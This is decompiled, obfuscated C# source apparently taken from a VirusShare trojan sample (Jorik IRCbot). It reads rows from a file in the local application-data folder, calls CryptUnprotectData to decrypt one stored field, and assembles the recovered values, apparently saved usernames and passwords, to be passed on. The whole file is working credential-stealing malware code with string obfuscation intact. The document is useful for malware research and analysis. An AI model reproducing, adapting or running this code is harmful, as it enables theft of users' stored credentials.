// Decompiled with JetBrains decompiler
// Type: .
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=24b8f1c2e28acde2
// MVID: 0C7B899D-7035-4B2D-B433-3C80E566FC1C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Jorik.IRCbot.gim-3e8d8a98ac44098acc3d92301b4ae92e5e6e1a5f0b2d861cd9e69e0650edce63.exe

using \u0003;
using \u0004;
using \u000E;
using \u000F;
using System;
using System.Runtime.InteropServices;

namespace \u000F
{
  internal sealed class \u0004
  {
    [NonSerialized]
    internal static \u0008.\u0004 \u009C;

    public static void \u0001([In] string obj0)
    {
      if (\u0011\u0002.\u0093\u0003(obj0))
        obj0 = \u000F.\u0004.\u009C(5668);
      string str1 = \u0010.\u008D(\u001B\u0003.\u0006\u0005(Environment.SpecialFolder.LocalApplicationData), \u000F.\u0004.\u009C(5681));
      try
      {
        \u0006 obj = new \u0006(str1);
        while (true)
        {
          obj.\u0001(\u000F.\u0004.\u009C(5742));
          if (true)
          {
            if (!\u0011\u0002.\u0094\u0003(str1))
              break;
            int num;
            if (true)
              num = 0;
            for (; num <= obj.\u0001() - 1; ++num)
            {
              try
              {
                string str2;
                string str3;
                string str4;
                if (true)
                {
                  str2 = obj.\u0001(num, \u000F.\u0004.\u009C(5751));
                  str3 = obj.\u0001(num, \u000F.\u0004.\u009C(5768));
                  str4 = \u000F.\u0004.\u0001(\u0081.\u007E\u008F\u0002((object) \u0080.\u008B\u0002(), obj.\u0001(num, \u000F.\u0004.\u009C(5789))));
                  if (!\u0007.\u0087(str3, \u000F.\u0004.\u009C(1675)) || !\u0007.\u0087(str4, \u000F.\u0004.\u009C(1675)) || !\u0007.\u0087(str4, \u000F.\u0004.\u009C(5810)) || !\u0005.\u007E\u0081((object) str2, obj0) && !\u0007.\u0088(obj0, \u000F.\u0004.\u009C(5668)))
                    goto label_15;
                }
                string[] strArray = new string[6]
                {
                  \u000F.\u0004.\u009C(5819),
                  \u0002.\u0001(\u0010.\u008D(\u000F.\u0004.\u009C(664), str2)),
                  \u000F.\u0004.\u009C(669),
                  \u0002.\u0001(\u0010.\u008D(\u000F.\u0004.\u009C(664), str3)),
                  \u000F.\u0004.\u009C(3932),
                  \u0002.\u0001(\u0010.\u008D(\u000F.\u0004.\u009C(664), str4))
                };
                \u0002.\u0001(\u0018.\u001A\u0002(strArray), \u0001.\u0010);
label_15:
                \u001F.\u0087\u0002(100);
              }
              catch
              {
              }
            }
            break;
          }
        }
      }
      catch
      {
      }
    }

    public static string \u0001([In] string obj0)
    {
      if (\u0011\u0002.\u0093\u0003(obj0))
        obj0 = \u000F.\u0004.\u009C(5668);
      string str1 = \u0010.\u008D(\u001B\u0003.\u0006\u0005(Environment.SpecialFolder.LocalApplicationData), \u000F.\u0004.\u009C(5681));
      try
      {
        \u0006 obj = new \u0006(str1);
        obj.\u0001(\u000F.\u0004.\u009C(5742));
        if (\u0011\u0002.\u0094\u0003(str1))
        {
          for (int index = 0; index <= obj.\u0001() - 1; ++index)
          {
            try
            {
              string str2;
              string str3;
              string str4;
              if (true)
              {
                str2 = obj.\u0001(index, \u000F.\u0004.\u009C(5751));
                str3 = obj.\u0001(index, \u000F.\u0004.\u009C(5768));
                str4 = \u000F.\u0004.\u0001(\u0081.\u007E\u008F\u0002((object) \u0080.\u008B\u0002(), obj.\u0001(index, \u000F.\u0004.\u009C(5789))));
                if (!\u0007.\u0087(str3, \u000F.\u0004.\u009C(1675)))
                  continue;
              }
              if (\u0007.\u0087(str4, \u000F.\u0004.\u009C(1675)))
              {
                if (\u0007.\u0087(str4, \u000F.\u0004.\u009C(5810)))
                {
                  if (!\u0005.\u007E\u0081((object) str2, obj0))
                  {
                    if (!\u0007.\u0088(obj0, \u000F.\u0004.\u009C(5668)))
                      continue;
                  }
                  return \u0011.\u008E(str3, \u000F.\u0004.\u009C(614), str4);
                }
              }
            }
            catch
            {
              return \u000F.\u0004.\u009C(1675);
            }
          }
        }
      }
      catch
      {
        return \u000F.\u0004.\u009C(1675);
      }
      return \u000F.\u0004.\u009C(1675);
    }

    [DllImport("Crypt32.dll", EntryPoint = "CryptUnprotectData", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool \u0001(
      [In] ref \u000F.\u0004.\u0003 obj0,
      [In] string obj1,
      [In] ref \u000F.\u0004.\u0003 obj2,
      [In] IntPtr obj3,
      [In] ref \u000F.\u0004.\u0002 obj4,
      [In] int obj5,
      [In] ref \u000F.\u0004.\u0003 obj6);

    private static string \u0001([In] byte[] obj0)
    {
      \u000F.\u0004.\u0003 obj1;
      \u000F.\u0004.\u0003 obj2;
      \u000F.\u0004.\u0003 obj3;
      \u000F.\u0004.\u0002 obj4;
      if (true)
      {
        obj1 = new \u000F.\u0004.\u0003();
        obj2 = new \u000F.\u0004.\u0003();
        GCHandle gcHandle = \u001C\u0003.\u0007\u0005((object) obj0, GCHandleType.Pinned);
        obj1.\u0001 = gcHandle.AddrOfPinnedObject();
        obj1.\u0001 = obj0.Length;
        gcHandle.Free();
        obj3 = new \u000F.\u0004.\u0003();
        obj4 = new \u000F.\u0004.\u0002();
      }
      \u000F.\u0004.\u0001(ref obj1, (string) null, ref obj3, IntPtr.Zero, ref obj4, 0, ref obj2);
      byte[] numArray = new byte[obj2.\u0001 + 1];
      \u001D\u0003.\u0008\u0005(obj2.\u0001, numArray, 0, obj2.\u0001);
      string str = \u0019\u0002.\u007E\u009E\u0003((object) \u0080.\u008B\u0002(), numArray);
      return \u001D.\u007E\u0084\u0002((object) str, 0, \u0019.\u007E\u001C\u0002((object) str) - 1);
    }

    static \u0004() => \u0005.\u0001(typeof (\u000F.\u0004));

    private enum \u0001
    {
      \u0001 = 1,
      \u0002 = 2,
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct \u0002
    {
      public int \u0001;
      public \u000F.\u0004.\u0001 \u0001;
      public IntPtr \u0001;
      public string \u0001;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct \u0003
    {
      public int \u0001;
      public IntPtr \u0001;
    }
  }
}
